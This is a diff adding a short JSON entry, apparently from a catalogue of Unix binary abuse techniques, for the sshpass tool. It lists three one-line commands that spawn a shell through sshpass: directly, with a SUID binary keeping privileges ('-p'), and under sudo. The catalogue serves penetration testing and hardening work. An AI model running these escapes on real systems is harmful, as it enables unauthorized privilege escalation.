@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "sshpass /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./sshpass /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo sshpass /bin/sh\n"
+      }
+    ]
+  }
+}
